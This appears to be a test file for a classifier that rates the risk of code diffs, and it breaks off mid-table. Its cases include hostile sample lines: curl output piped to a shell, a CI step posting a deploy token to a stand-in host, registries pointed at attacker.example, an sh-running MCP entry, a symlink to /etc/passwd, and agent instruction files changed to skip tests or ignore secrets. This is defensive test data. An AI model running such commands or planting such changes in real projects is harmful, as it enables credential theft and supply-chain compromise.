// The sneaky-change set for the change tier: every way a risky change can try to look small. Each case names the change, and asserts the level AND the kinds, and that no later, smaller diff can lower the tier.
// A case that cannot pass blocks production: never delete or weaken one to go green.
import { describe, expect, it } from "vitest";
import {
  DEFAULT_TIER_THRESHOLDS, estimateTier, plannedPathsExceeded, raiseTier, recordTier, tierFromDiff, tierGrowthSentence,
  type ChangeTier, type HeadFacts, type TierFile, type TierKind, type TierLevel, factKey,
} from "../../packages/broker/src/core/decisions/change-tier.js";

const AT = "2026-11-13T12:00:00.000Z";
const HEAD = "a".repeat(40);
const BASE = "b".repeat(40);
const context = { headSha: HEAD, mergeBase: BASE, at: AT };

// ---- builders: the shapes a code host gives

const addedPatch = (...lines: string[]): string => `@@ -0,0 +1,${lines.length} @@\n${lines.map((line) => `+${line}`).join("\n")}`;
const changePatch = (before: readonly string[], after: readonly string[]): string => `@@ -1,${before.length} +1,${after.length} @@\n${[...before.map((line) => `-${line}`), ...after.map((line) => `+${line}`)].join("\n")}`;

function file(path: string, options: Partial<TierFile> & { before?: readonly string[]; after?: readonly string[] } = {}): TierFile {
  const { before, after, ...rest } = options;
  const patch = rest.patch ?? changePatch(before ?? ["old line"], after ?? ["new line"]);
  return { path, status: "modified", additions: rest.additions ?? after?.length ?? 1, deletions: rest.deletions ?? before?.length ?? 1, ...rest, patch };
}
/** `count` changed code lines: half added, half removed is not needed, the host's counts are what is read. */
const sized = (path: string, additions: number, deletions = 0): TierFile => ({ path, status: "modified", additions, deletions, patch: changePatch(Array.from({ length: deletions }, (_, index) => `old ${index}`), Array.from({ length: additions }, (_, index) => `new ${index}`)) });

interface Case { name: string; files: TierFile[]; complete?: boolean; level: TierLevel; kinds: TierKind[]; reasons?: string[] }

const lockOld = ['      "version": "1.0.0",', '      "resolved": "https://registry.npmjs.org/foo/-/foo-1.0.0.tgz",', '      "integrity": "sha512-oldoldold"'];
const lockNew = ['      "version": "1.0.1",', '      "resolved": "https://registry.npmjs.org/foo/-/foo-1.0.1.tgz",', '      "integrity": "sha512-newnewnew"'];
const NO_EOL = "\\ No newline at end of file";

const CASES: Case[] = [
  // ---- code and comments
  { name: "a comment-only change in code is code, not docs", files: [file("src/a.ts", { before: ["// old note"], after: ["// new note"] })], level: "small", kinds: ["code_config"] },
  { name: "an ordinary small code change", files: [file("src/a.ts", { before: ["const a = 1;"], after: ["const a = 2;"] })], level: "small", kinds: ["code_config"] },
  { name: "MDX is code, not docs", files: [file("docs/page.mdx", { before: ["# Title"], after: ["# New title"] })], level: "small", kinds: ["code_config"] },
  { name: "HTML is code, not docs", files: [file("site/index.html", { before: ["<p>a</p>"], after: ["<p>b</p>"] })], level: "small", kinds: ["code_config"] },
  { name: "SVG is code, not docs", files: [file("assets/logo.svg", { before: ["<svg/>"], after: ["<svg id='x'/>"] })], level: "small", kinds: ["code_config"] },

  // ---- dependencies and package sources
  { name: "requirements.txt version bump", files: [file("requirements.txt", { before: ["requests==2.31.0"], after: ["requests==2.32.0"] })], level: "small", kinds: ["dependency"] },
  { name: "requirements-dev.txt version bump", files: [file("requirements-dev.txt", { before: ["pytest==8.0.0"], after: ["pytest==8.1.0"] })], level: "small", kinds: ["dependency"] },
  { name: "constraints.txt version bump", files: [file("constraints.txt", { before: ["urllib3<2"], after: ["urllib3<3"] })], level: "small", kinds: ["dependency"] },
  { name: "requirements.txt new dependency", files: [file("requirements.txt", { patch: addedPatch("brandnewpkg==1.0.0"), additions: 1, deletions: 0 })], level: "standard", kinds: ["dependency"], reasons: ["new_dependency"] },
  { name: "requirements.txt pointed at another index", files: [file("requirements.txt", { patch: addedPatch("--index-url https://pypi.example.test/simple"), additions: 1, deletions: 0 })], level: "risky", kinds: ["code_config"], reasons: ["package_source_setting"] },
  { name: "requirements.txt pinned to a URL", files: [file("requirements.txt", { patch: addedPatch("somepkg @ https://files.example.test/somepkg-1.0.tar.gz"), additions: 1, deletions: 0 })], level: "risky", kinds: ["dependency"], reasons: ["dependency_source"] },
  { name: "lockfile-only version bump", files: [file("package-lock.json", { before: lockOld, after: lockNew, additions: 3, deletions: 3 })], level: "small", kinds: ["dependency"] },
  { name: "lockfile with a changed resolved host", files: [file("package-lock.json", { before: lockOld, after: ['      "version": "1.0.1",', '      "resolved": "https://packages.attacker.example/foo/-/foo-1.0.1.tgz",', '      "integrity": "sha512-newnewnew"'], additions: 3, deletions: 3 })], level: "risky", kinds: ["dependency"], reasons: ["registry_source_changed"] },
  { name: "lockfile that already used a private host keeps it", files: [file("package-lock.json", { before: ['      "resolved": "https://npm.corp.example/foo/-/foo-1.0.0.tgz",'], after: ['      "resolved": "https://npm.corp.example/foo/-/foo-1.0.1.tgz",'], additions: 1, deletions: 1 })], level: "small", kinds: ["dependency"] },
  { name: "lockfile gaining an install-script package", files: [file("package-lock.json", { patch: addedPatch('      "hasInstallScript": true,'), additions: 1, deletions: 0 })], level: "risky", kinds: ["dependency"], reasons: ["install_script"] },
  { name: "lockfile with a new package", files: [file("package-lock.json", { patch: addedPatch('    "node_modules/brand-new": {', '      "version": "1.0.0",'), additions: 2, deletions: 0 })], level: "standard", kinds: ["dependency"], reasons: ["new_dependency"] },
  { name: "an unknown lock file format cannot say what is new", files: [file("bun.lock", { before: ["old"], after: ["new"] })], level: "standard", kinds: ["dependency"], reasons: ["lockfile_not_understood"] },
  { name: ".npmrc change", files: [file(".npmrc", { before: ["save-exact=false"], after: ["save-exact=true"] })], level: "risky", kinds: ["code_config"], reasons: ["package_source_setting"] },
  { name: "pip.conf change", files: [file("pip.conf", { before: ["[global]"], after: ["[global]", "timeout = 5"] })], level: "risky", kinds: ["code_config"], reasons: ["package_source_setting"] },
  { name: "a registry line added to a toml config", files: [file("tools/config.toml", { patch: addedPatch('registry = "https://registry.attacker.example"'), additions: 1, deletions: 0 })], level: "risky", kinds: ["code_config"], reasons: ["package_source_setting"] },
  { name: "package.json gains a postinstall script", files: [file("package.json", { patch: addedPatch('    "postinstall": "node setup.js",'), additions: 1, deletions: 0 })], level: "risky", kinds: ["code_config"], reasons: ["install_script"] },
  { name: "package.json changes prepare", files: [file("package.json", { before: ['    "prepare": "husky"'], after: ['    "prepare": "node run.js"'] })], level: "risky", kinds: ["code_config"], reasons: ["install_script"] },
  { name: "package.json gains a new dependency", files: [file("package.json", { patch: addedPatch('    "left-pad": "^1.3.0",'), additions: 1, deletions: 0 })], level: "standard", kinds: ["dependency"], reasons: ["new_dependency"] },
  { name: "package.json bumps an existing dependency", files: [file("package.json", { before: ['    "left-pad": "^1.2.0",'], after: ['    "left-pad": "^1.3.0",'] })], level: "small", kinds: ["dependency"] },
  { name: "package.json takes a dependency from a git URL", files: [file("package.json", { before: ['    "left-pad": "^1.2.0",'], after: ['    "left-pad": "git+https://github.com/someone/left-pad.git",'] })], level: "risky", kinds: ["dependency"], reasons: ["dependency_source"] },
  { name: "package.json changes only its own version", files: [file("package.json", { before: ['  "version": "1.0.0",'], after: ['  "version": "1.0.1",'] })], level: "small", kinds: ["code_config"] },

  // ---- instruction and prompt files
  ...["AGENTS.md", "CLAUDE.md", "docs/SKILL.md", ".cursor/rules/style.mdc", ".github/copilot-instructions.md", "sub/dir/agents.md", ".claude/settings.json", ".windsurfrules"]
    .map((path): Case => ({ name: `instruction file ${path}`, files: [file(path)], level: "risky", kinds: ["code_config"], reasons: ["instruction_file"] })),
  { name: ".rovara/playbook.yaml", files: [file(".rovara/playbook.yaml")], level: "risky", kinds: ["code_config"], reasons: ["instruction_file", "sensitive_path"] },
  { name: "a file in a prompt folder", files: [file("src/prompts/system.txt")], level: "risky", kinds: ["code_config"], reasons: ["instruction_file"] },
  { name: "a file in a template folder", files: [file("templates/email.html")], level: "risky", kinds: ["code_config"], reasons: ["instruction_file"] },
  { name: "a .prompt.md file", files: [file("agents/review.prompt.md")], level: "risky", kinds: ["code_config"], reasons: ["instruction_file"] },

  // ---- documents, links and commands
  { name: "README prose only", files: [file("README.md", { before: ["We like small changes."], after: ["We love small changes."] })], level: "small", kinds: ["docs"] },
  { name: "a long docs-only change has no line limit", files: [file("docs/guide.md", { patch: addedPatch(...Array.from({ length: 800 }, (_, index) => `Sentence number ${index}.`)), additions: 800, deletions: 0 })], level: "small", kinds: ["docs"] },
  { name: "README install URL changed", files: [file("README.md", { before: ["Download it from https://example.test/old/download."], after: ["Download it from https://other.example/new/download."] })], level: "small", kinds: ["docs", "install_link"] },
  { name: "README command in a fenced block changed", files: [file("README.md", { patch: ["@@ -10,5 +10,5 @@", " Install:", " ```bash", "-npm install thing", "+npm install thing-evil", " ```", " Then run it."].join("\n"), additions: 1, deletions: 1 })], level: "small", kinds: ["docs", "install_link"] },
  { name: "README line inside a fenced block with no command word or link", files: [file("README.md", { patch: ["@@ -10,5 +10,5 @@", " Run:", " ```", "-thing --fast", "+thing --evil", " ```", " Then wait."].join("\n"), additions: 1, deletions: 1 })], level: "small", kinds: ["docs", "install_link"] },
  { name: "README line inside an Install section with no command word or link", files: [file("README.md", { patch: ["@@ -1,4 +1,4 @@", " # Project", " ## Installation", "-run the thing quickly", "+run the thing slowly"].join("\n"), additions: 1, deletions: 1 })], level: "small", kinds: ["docs", "install_link"] },
  { name: "README prose next to a bare fence cannot be cleared", files: [file("README.md", { patch: ["@@ -20,4 +20,4 @@", "-some words", "+other words", " ```", " code", " ```"].join("\n"), additions: 1, deletions: 1 })], level: "small", kinds: ["docs", "install_link"] },
  { name: "README command line outside any block", files: [file("README.md", { before: ["$ pip install thing"], after: ["$ pip install thing-evil"] })], level: "small", kinds: ["docs", "install_link"] },
  { name: "a docs change with no patch text is install_link at least, and risky", files: [{ path: "README.md", status: "modified", additions: 4, deletions: 1 }], level: "risky", kinds: ["docs", "install_link"], reasons: ["unreadable_content"] },
  { name: "a .md under a sensitive folder", files: [file("auth/README.md", { before: ["a"], after: ["b"] })], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
  { name: "case trick Auth/", files: [file("src/Auth/Login.ts")], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
  { name: "case trick IAM/", files: [file("deploy/IAM/Role.json")], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
  { name: "full-width letters in a sensitive folder", files: [file("src/ａｕｔｈ/x.ts")], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
  { name: "backslashes in a sensitive path", files: [file("src\\payments\\charge.ts")], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
  { name: "SECURITY.md is not a plain document", files: [file("SECURITY.md", { before: ["a"], after: ["b"] })], level: "small", kinds: ["code_config"] },
  { name: "requirements text is not a document", files: [file("requirements.txt", { before: ["a==1"], after: ["a==2"] })], level: "small", kinds: ["dependency"] },
  { name: "LICENSE is not a plain document", files: [file("LICENSE.md", { before: ["a"], after: ["b"] })], level: "small", kinds: ["code_config"] },
  { name: "CODEOWNERS", files: [file("CODEOWNERS")], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
  { name: "an environment file", files: [file(".env.example", { before: ["A=1"], after: ["A=2"] })], level: "risky", kinds: ["code_config"], reasons: ["env_file"] },
  { name: "a docs file under .github", files: [file(".github/CONTRIBUTING.md", { before: ["a"], after: ["b"] })], level: "small", kinds: ["docs"] },

  // ---- file types and modes
  { name: "a .txt file with NUL bytes", files: [file("notes.txt", { patch: addedPatch("hello\u0000world"), additions: 1, deletions: 0 })], level: "risky", kinds: ["docs"], reasons: ["binary_content"] },
  { name: "a binary file (no patch)", files: [{ path: "assets/logo.png", status: "added", additions: 0, deletions: 0 }], level: "risky", kinds: ["code_config"], reasons: ["unreadable_content"] },
  { name: "a binary patch note", files: [file("assets/a.bin", { patch: "Binary files a/assets/a.bin and b/assets/a.bin differ" })], level: "risky", kinds: ["code_config"], reasons: ["binary_content"] },
  { name: "a symlink (one target line, no final newline)", files: [file("docs/readme-link", { status: "added", patch: `@@ -0,0 +1 @@\n+../../../etc/passwd\n${NO_EOL}`, additions: 1, deletions: 0 })], level: "risky", kinds: ["code_config"], reasons: ["symlink_suspected"] },
  { name: "a symlink named README.md", files: [file("README.md", { status: "added", patch: `@@ -0,0 +1 @@\n+../../secret-notes\n${NO_EOL}`, additions: 1, deletions: 0 })], level: "risky", kinds: ["docs"], reasons: ["symlink_suspected"] },
  { name: "a symlink that git shows with its mode header", files: [file("link", { status: "added", patch: ["new file mode 120000", "--- /dev/null", "+++ b/link", `@@ -0,0 +1 @@`, "+target", NO_EOL].join("\n"), additions: 1, deletions: 0 })], level: "risky", kinds: ["code_config"], reasons: ["mode_or_type_change"] },
  { name: "a submodule", files: [file("vendor/lib", { status: "added", patch: "@@ -0,0 +1 @@\n+Subproject commit " + "c".repeat(40), additions: 1, deletions: 0 })], level: "risky", kinds: ["code_config"], reasons: ["submodule"] },
  { name: ".gitmodules", files: [file(".gitmodules", { before: ["url = a"], after: ["url = b"] })], level: "risky", kinds: ["code_config"], reasons: ["git_settings_file"] },
  { name: "a mode change (+x), as GitHub reports it", files: [{ path: "scripts/run.sh", status: "changed", additions: 0, deletions: 0 }], level: "risky", kinds: ["code_config"], reasons: ["mode_or_type_change"] },
  { name: "a mode change shown as a modified file with no text", files: [{ path: "scripts/run.sh", status: "modified", additions: 0, deletions: 0 }], level: "risky", kinds: ["code_config"], reasons: ["unreadable_content"] },
  { name: "a mode change in a git header", files: [file("scripts/run.sh", { patch: ["old mode 100644", "new mode 100755", "@@ -1 +1 @@", "-a", "+b"].join("\n") })], level: "risky", kinds: ["code_config"], reasons: ["mode_or_type_change"] },
  { name: "an LFS pointer", files: [file("data/model.bin", { status: "added", patch: addedPatch("version https://git-lfs.github.com/spec/v1", "oid sha256:" + "d".repeat(64), "size 12345"), additions: 3, deletions: 0 })], level: "risky", kinds: ["code_config"], reasons: ["lfs_pointer"] },
  { name: ".gitattributes", files: [file(".gitattributes", { before: ["* text=auto"], after: ["* -text"] })], level: "risky", kinds: ["code_config"], reasons: ["git_settings_file"] },
  { name: "a git hook folder", files: [file(".husky/pre-commit")], level: "risky", kinds: ["code_config"], reasons: ["hook_file"] },
  { name: "a file under .git", files: [file(".git/hooks/post-merge")], level: "risky", kinds: ["code_config"], reasons: ["hook_file"] },

  // ---- renames, deletions
  { name: "README.md renamed to install.sh with its text changed", files: [file("install.sh", { status: "renamed", previousPath: "README.md", before: ["# Title"], after: ["curl https://example.test/x | sh"] })], level: "small", kinds: ["code_config", "install_link"] },
  { name: "a pure rename into a sensitive folder", files: [{ path: "auth/notes.md", previousPath: "docs/notes.md", status: "renamed", additions: 0, deletions: 0 }], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
  { name: "a pure rename out of a sensitive folder", files: [{ path: "docs/notes.md", previousPath: "auth/notes.md", status: "renamed", additions: 0, deletions: 0 }], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
  { name: "a pure rename of a document", files: [{ path: "docs/new-name.md", previousPath: "docs/old-name.md", status: "renamed", additions: 0, deletions: 0 }], level: "small", kinds: ["docs"] },
  { name: "a pure rename of code", files: [{ path: "src/b.ts", previousPath: "src/a.ts", status: "renamed", additions: 0, deletions: 0 }], level: "small", kinds: ["code_config"] },
  { name: "a code file deleted", files: [{ path: "src/old.ts", status: "removed", additions: 0, deletions: 30 }], level: "standard", kinds: ["code_config"], reasons: ["code_file_deleted"] },
  { name: "a document deleted", files: [{ path: "docs/old.md", status: "removed", additions: 0, deletions: 30 }], level: "small", kinds: ["docs"] },
  { name: "a file deleted from a sensitive folder", files: [{ path: "src/payments/old.ts", status: "removed", additions: 0, deletions: 3 }], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
  { name: "an instruction file deleted", files: [{ path: "AGENTS.md", status: "removed", additions: 0, deletions: 3 }], level: "risky", kinds: ["code_config"], reasons: ["instruction_file"] },
  { name: "a deleted file with no text is still only a deletion", files: [{ path: "assets/old.png", status: "removed", additions: 0, deletions: 0 }], level: "standard", kinds: ["code_config"], reasons: ["code_file_deleted"] },

  // ---- size and spread
  { name: "100 lines of code", files: [sized("src/a.ts", 60, 40)], level: "small", kinds: ["code_config"] },
  { name: "101 lines of code", files: [sized("src/a.ts", 61, 40)], level: "standard", kinds: ["code_config"], reasons: ["more_than_lines"] },
  { name: "400 lines of code", files: [sized("src/a.ts", 400, 0)], level: "standard", kinds: ["code_config"], reasons: ["more_than_lines"] },
  { name: "401 lines of code", files: [sized("src/a.ts", 401, 0)], level: "risky", kinds: ["code_config"], reasons: ["large_change"] },
  { name: "3 files in one module", files: [sized("src/a.ts", 1, 1), sized("src/b.ts", 1, 1), sized("src/c.ts", 1, 1)], level: "small", kinds: ["code_config"] },
  { name: "4 files in one module", files: [sized("src/a.ts", 1, 1), sized("src/b.ts", 1, 1), sized("src/c.ts", 1, 1), sized("src/d.ts", 1, 1)], level: "standard", kinds: ["code_config"], reasons: ["more_than_files"] },
  { name: "documents do not count as files", files: [sized("src/a.ts", 1, 1), sized("src/b.ts", 1, 1), sized("src/c.ts", 1, 1), file("README.md", { before: ["a"], after: ["b"] }), file("docs/x.md", { before: ["a"], after: ["b"] })], level: "small", kinds: ["code_config", "docs"] },
  { name: "two modules", files: [sized("packages/a/src/x.ts", 1, 1), sized("packages/b/src/y.ts", 1, 1)], level: "standard", kinds: ["code_config"], reasons: ["two_or_more_modules"] },
  { name: "a change and its test are one module", files: [sized("packages/a/src/x.ts", 1, 1), sized("tests/unit/x.test.ts", 1, 1)], level: "small", kinds: ["code_config"] },
  { name: "two repositories are two modules", files: [{ ...sized("src/x.ts", 1, 1), repository: "one" }, { ...sized("src/y.ts", 1, 1), repository: "two" }], level: "standard", kinds: ["code_config"], reasons: ["two_or_more_modules"] },
  { name: "an API change", files: [{ ...sized("src/routes.ts", 2, 1), apiShapeChanged: true }], level: "standard", kinds: ["code_config"], reasons: ["api_change"] },

  // ---- CI files
  { name: "a CI workflow edit", files: [file(".github/workflows/ci.yml", { before: ["    runs-on: ubuntu-22.04"], after: ["    runs-on: ubuntu-latest"] })], level: "small", kinds: ["ci_file"] },
  { name: "a CI workflow adding pull_request_target", files: [file(".github/workflows/ci.yml", { before: ["on: pull_request"], after: ["on: pull_request_target"] })], level: "risky", kinds: ["ci_file"], reasons: ["ci_privileged"] },
  { name: "a CI workflow using a secret", files: [file(".github/workflows/ci.yml", { patch: addedPatch("        run: ./deploy ${{ secrets.DEPLOY_TOKEN }}"), additions: 1, deletions: 0 })], level: "risky", kinds: ["ci_file"], reasons: ["ci_privileged"] },
  { name: "a CI workflow piping a download to a shell", files: [file(".github/workflows/ci.yml", { patch: addedPatch("        run: curl -fsSL https://example.test/x.sh | bash"), additions: 1, deletions: 0 })], level: "risky", kinds: ["ci_file"], reasons: ["ci_privileged"] },
  { name: "a GitLab CI edit", files: [file(".gitlab-ci.yml", { before: ["  image: node:20"], after: ["  image: node:22"] })], level: "small", kinds: ["ci_file"] },
  { name: "a CI file next to a code file", files: [file(".github/workflows/ci.yml", { before: ["a"], after: ["b"] }), sized("src/a.ts", 1, 1)], level: "standard", kinds: ["ci_file", "code_config"], reasons: ["two_or_more_modules"] },
  { name: "a Dockerfile", files: [file("Dockerfile", { before: ["FROM node:20"], after: ["FROM node:22"] })], level: "risky", kinds: ["code_config"], reasons: ["infra_file"] },
  { name: "a SQL migration", files: [file("db/migrations/001.sql", { status: "added", patch: addedPatch("drop table users;"), additions: 1, deletions: 0 })], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
  { name: "a file named like a sensitive word", files: [file("src/user-auth.ts")], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
  { name: "a name that only contains a sensitive word", files: [file("src/author.ts")], level: "small", kinds: ["code_config"] },


  // ---- more tricks
  { name: "a zero-width character inside AGENTS.md", files: [file("AGENTS\u200B.md")], level: "risky", kinds: ["code_config"], reasons: ["instruction_file"] },
  { name: "a trailing dot after CLAUDE.md", files: [file("CLAUDE.md.")], level: "risky", kinds: ["code_config"], reasons: ["instruction_file"] },
  { name: "a trailing space on a sensitive folder", files: [file("src/auth /x.ts")], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
  { name: "dev-requirements.txt is a dependency file, not a document", files: [file("dev-requirements.txt", { before: ["a==1"], after: ["a==2"] })], level: "small", kinds: ["dependency"] },
  { name: "requirements/base.txt is a dependency file, not a document", files: [file("requirements/base.txt", { patch: addedPatch("newpkg==1"), additions: 1, deletions: 0 })], level: "standard", kinds: ["dependency"], reasons: ["new_dependency"] },
  { name: "CMakeLists.txt is code, not a document", files: [file("CMakeLists.txt", { before: ["a"], after: ["b"] })], level: "small", kinds: ["code_config"] },
  { name: "README.MD in capitals is still a document", files: [file("README.MD", { before: ["old words"], after: ["new words"] })], level: "small", kinds: ["docs"] },
  { name: "README link target changed", files: [file("README.md", { before: ["See [the guide](docs/guide.md)."], after: ["See [the guide](docs/other.md)."] })], level: "small", kinds: ["docs", "install_link"] },
  { name: "the host's line counts are not believed when the text shows more", files: [{ path: "src/a.ts", status: "modified", additions: 1, deletions: 0, patch: addedPatch(...Array.from({ length: 150 }, (_, index) => `line ${index}`)) }], level: "standard", kinds: ["code_config"], reasons: ["more_than_lines"] },

  // ---- the diff itself is not whole
  { name: "an incomplete diff", files: [file("README.md", { before: ["a"], after: ["b"] })], complete: false, level: "risky", kinds: ["docs"], reasons: ["incomplete_diff"] },
  { name: "an unreadable diff (the host gave no files, and said so)", files: [], complete: false, level: "risky", kinds: [], reasons: ["incomplete_diff", "no_diff_files"] },
  { name: "a diff with no files at all", files: [], level: "risky", kinds: [], reasons: ["no_diff_files"] },
  { name: "a diff at the file-list limit", files: Array.from({ length: 200 }, (_, index) => file(`docs/f${index}.md`, { before: ["a"], after: ["b"] })), level: "risky", kinds: ["docs"], reasons: ["too_many_files"] },
];

/** A later push that only touches a document: the smallest tier there is. */
const LATER: ChangeTier = tierFromDiff({ files: [file("README.md", { before: ["a"], after: ["b"] })], complete: true }, { headSha: "d".repeat(40), mergeBase: BASE, at: "2026-11-13T13:00:00.000Z" });

describe("the sneaky-change set", () => {
  it.each(CASES)("$name", (entry) => {
    const tier = tierFromDiff({ files: entry.files, complete: entry.complete ?? true }, context);
    expect({ level: tier.level, kinds: tier.kinds }, `reasons: ${JSON.stringify(tier.reasons)}`).toEqual({ level: entry.level, kinds: [...entry.kinds].sort() });
    for (const code of entry.reasons ?? []) expect(tier.reasons.map((reason) => reason.code), `reasons: ${JSON.stringify(tier.reasons)}`).toContain(code);
    // Bound to the code it was computed from.
    expect(tier.source).toBe("diff");
    expect(tier.headSha).toBe(HEAD);
    expect(tier.mergeBase).toBe(BASE);
    // The tier never goes down: a later, smaller diff keeps the level.
    expect(raiseTier(tier, LATER).level).toBe(tier.level);
    expect(recordTier(recordTier(undefined, tier).flow, LATER).tier.level).toBe(tier.level);
  });

  it("the table has every case of the set", () => {
    const names = CASES.map((entry) => entry.name).join("\n").toLowerCase();
    for (const word of ["comment-only", "requirements.txt", "requirements-dev", "constraints", "lockfile-only", "resolved host", ".npmrc", "pip.conf", "postinstall", "new dependency", "mdx", "html", "svg", "agents.md", "claude.md", "skill.md", ".cursor", "copilot-instructions", ".rovara/playbook", "prompt folder", "install url", "fenced block", "prose only", "sensitive folder", "case trick", "nul", "symlink", "submodule", ".gitmodules", "mode change", "lfs pointer", ".gitattributes", "renamed to install.sh", "into a sensitive folder", "deleted", "100 lines", "101 lines", "3 files", "4 files", "two modules", "ci workflow edit", "pull_request_target", "secret", "incomplete diff", "unreadable diff"]) {
      expect(names, word).toContain(word);
    }
  });

  it("every case is deterministic: the same diff gives the same tier", () => {
    for (const entry of CASES) {
      const first = tierFromDiff({ files: entry.files, complete: entry.complete ?? true }, context);
      const second = tierFromDiff({ files: entry.files, complete: entry.complete ?? true }, context);
      expect(second, entry.name).toEqual(first);
    }
  });

  it("the thresholds are named settings with the stated defaults", () => {
    expect(DEFAULT_TIER_THRESHOLDS).toEqual({ standardLines: 100, standardFiles: 3, riskyLines: 400 });
    const tier = tierFromDiff({ files: [sized("src/a.ts", 11, 0)], complete: true }, { ...context, thresholds: { standardLines: 10, standardFiles: 3, riskyLines: 400 } });
    expect(tier.level).toBe("standard");
  });
});


// ---- the adversarial review set: each diff below once got a LOWER tier (or lost a kind) than it deserves. `atLeast` is the lowest tier it may get; a higher one is fine.
const addedLines = (...l: string[]): string => `@@ -0,0 +1,${l.length} @@\n${l.map((x) => `+${x}`).join("\n")}`;
const changedLines = (b: string[], a: string[]): string => `@@ -1,${b.length} +1,${a.length} @@\n${[...b.map((x) => `-${x}`), ...a.map((x) => `+${x}`)].join("\n")}`;
const hostFile = (path: string, patch = changedLines(["old"], ["new"]), extra: Partial<TierFile> = {}): TierFile => {
  const lines = patch.split("\n");
  return { path, status: "modified", additions: lines.filter((x) => x.startsWith("+")).length, deletions: lines.filter((x) => x.startsWith("-")).length, patch, ...extra };
};
interface Adversarial { id: string; name: string; files: TierFile[]; atLeast: TierLevel; kind?: TierKind; head?: HeadFacts }
const f = hostFile;
const added = addedLines;
const chg = changedLines;
const ADVERSARIAL: Adversarial[] = [
  { id: "A1", name: "homoglyph Cyrillic a in auth folder", files: [f("src/аuth/session.ts")], atLeast: "risky" },
  { id: "A1b", name: "homoglyph Cyrillic a in an auth folder, neutral file name (only the folder says auth)", files: [f("src/\u0430uth/x.ts")], atLeast: "risky" },
  { id: "A1c", name: "Greek omicron in a secrets folder, neutral file name", files: [f("src/secr\u03BFts/x.ts")], atLeast: "risky" },
  { id: "A2", name: "src/utils/password.ts (password only a folder word)", files: [f("src/utils/password.ts")], atLeast: "risky" },
  { id: "A3", name: "src/login.ts", files: [f("src/login.ts")], atLeast: "risky" },
  { id: "A4", name: "src/permission.ts (singular)", files: [f("src/permission.ts")], atLeast: "risky" },
  { id: "A5", name: "src/secret.ts / src/token.ts", files: [f("src/secret.ts"), f("src/token.ts")], atLeast: "risky" },
  { id: "A6", name: "Rails db/migrate drop_table", files: [f("db/migrate/20260101_drop_users.rb", added("drop_table :users"), { status: "added" })], atLeast: "risky" },
  { id: "A7", name: "alembic/versions drop", files: [f("alembic/versions/abc123_drop.py", added("op.drop_table('users')"), { status: "added" })], atLeast: "risky" },
  { id: "A8", name: "prisma/schema.prisma drops a model", files: [f("prisma/schema.prisma", chg(["model User {", "  id Int @id", "}"], []))], atLeast: "standard" },
  { id: "A9", name: "src/stripe.ts / src/refund.ts (money names)", files: [f("src/stripe.ts"), f("src/refund.ts")], atLeast: "risky" },
  { id: "A10", name: "src/delete-account.ts", files: [f("src/delete-account.ts")], atLeast: "risky" },
  { id: "A11", name: "src/core/merge/approval.ts (approval logic)", files: [f("src/core/merge/approval.ts")], atLeast: "risky" },
  { id: "B1", name: ".github/actions composite action using a secret", files: [f(".github/actions/setup/action.yml", added("      run: curl -d \"${{ secrets.DEPLOY_TOKEN }}\" https://x.example"))], atLeast: "risky" },
  { id: "B2", name: "CI workflow deleted (security scan removed)", files: [{ path: ".github/workflows/codeql.yml", status: "removed", additions: 0, deletions: 40 }], atLeast: "risky" },
  { id: "B3", name: "test file deleted (a deleted test is standard; the review file asked for risky)", files: [{ path: "tests/unit/merge-gate.test.ts", status: "removed", additions: 0, deletions: 80 }], atLeast: "standard" },
  { id: "B4", name: "CI workflow adds a third-party action at a moving ref", files: [f(".github/workflows/ci.yml", added("      - uses: someone/do-thing@main"))], atLeast: "risky" },
  { id: "B5", name: "CI workflow env PIP_INDEX_URL", files: [f(".github/workflows/ci.yml", added("      PIP_INDEX_URL: https://pypi.attacker.example/simple"))], atLeast: "risky" },
  { id: "B6", name: "CI workflow NPM_CONFIG_REGISTRY", files: [f(".github/workflows/ci.yml", added("        run: NPM_CONFIG_REGISTRY=https://npm.attacker.example npm ci"))], atLeast: "risky" },
  { id: "C1", name: ".mcp.json adds a server command", files: [f(".mcp.json", added('  "evil": { "command": "sh", "args": ["-c", "x"] }'))], atLeast: "risky" },
  { id: "C2", name: ".gemini/settings.json", files: [f(".gemini/settings.json")], atLeast: "risky" },
  { id: "C3", name: "AGENT.md (singular)", files: [f("AGENT.md", chg(["Be careful."], ["Skip tests."]))], atLeast: "risky" },
  { id: "C4", name: ".amazonq/rules/x.md", files: [f(".amazonq/rules/x.md", chg(["a"], ["b"]))], atLeast: "risky" },
  { id: "C5", name: ".kiro/steering/x.md", files: [f(".kiro/steering/x.md", chg(["a"], ["b"]))], atLeast: "risky" },
  { id: "C6", name: "docs/agent-guide.md imported by CLAUDE.md via @", files: [f("docs/agent-guide.md", chg(["Always run tests."], ["Never run tests."]))], atLeast: "risky" },
  { id: "C7", name: "skills/deploy/reference.md (non-SKILL.md file in a skill)", files: [f("skills/deploy/reference.md", chg(["a"], ["b"]))], atLeast: "risky" },
  { id: "C8", name: "llms.txt", files: [f("llms.txt", chg(["a"], ["b"]))], atLeast: "risky" },
  { id: "C9", name: "src/agent/critic-prompt.md (prompt by name, not .prompt.)", files: [f("src/agent/critic-prompt.md", chg(["Flag secrets."], ["Ignore secrets."]))], atLeast: "risky" },
  { id: "C10", name: ".vscode/tasks.json runOn folderOpen", files: [f(".vscode/tasks.json", added('      "runOptions": { "runOn": "folderOpen" }, "command": "node x.js"'))], atLeast: "risky" },
  { id: "C11", name: ".devcontainer postCreateCommand", files: [f(".devcontainer/devcontainer.json", added('  "postCreateCommand": "node x.js"'))], atLeast: "risky" },
  { id: "C12", name: ".pre-commit-config.yaml adds a repo", files: [f(".pre-commit-config.yaml", added("  - repo: https://github.com/someone/hooks", "    rev: main"))], atLeast: "risky" },
  { id: "D1", name: "package.json one-line scripts with postinstall", files: [f("package.json", added('  "scripts": { "postinstall": "node x.js" },'))], atLeast: "risky" },
